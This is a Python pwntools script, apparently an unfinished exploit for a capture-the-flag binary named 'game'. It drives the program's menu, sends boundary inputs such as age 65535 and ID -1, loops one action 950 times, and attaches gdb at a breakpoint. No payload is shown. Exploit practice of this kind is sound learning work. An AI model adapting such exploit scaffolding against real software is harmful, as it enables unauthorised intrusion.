from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']

def work(way=1):
    p.sendlineafter(">> ",str(1))
    p.sendlineafter(">> ",str(1))
def buy(which):
    p.sendlineafter(">> ",str(2))
    p.sendlineafter(">> ",str(which))
def look():
    p.sendlineafter(">> ",str(3))
    p.sendlineafter(">> ",str(1))
    p.sendlineafter(">> ",'n')
def visit(id,which):
    p.sendlineafter(">> ",str(4))
    p.sendlineafter("visit?\n",str(id))
    p.sendlineafter("n)\n",'y')
    p.sendlineafter(">> ",str(which))



def run():
    p.sendlineafter("name:",'a'*8)
    p.sendlineafter("age:",str(65535))
    p.sendlineafter("ID:",str(-1))
    p.sendlineafter(":",'y')

    for i in range(950):
        work()

    gdb.attach(p,"b *$rebase(0x4ddc)")
    raw_input()

    look()
    for i in range(0x12+1):
        work()
    # buy(2)
    # visit(0,2)


    p.interactive()

i=0
while(i==0):
    try:
        # p = process(["./ld-2.26.so", "./lemon_pwn"], env={"LD_PRELOAD":"./libc-2.26.so"})
        p = process("./game")
        run()
        i+=1
    except:
        i+=1
        sleep(1)
        p.close()
        continue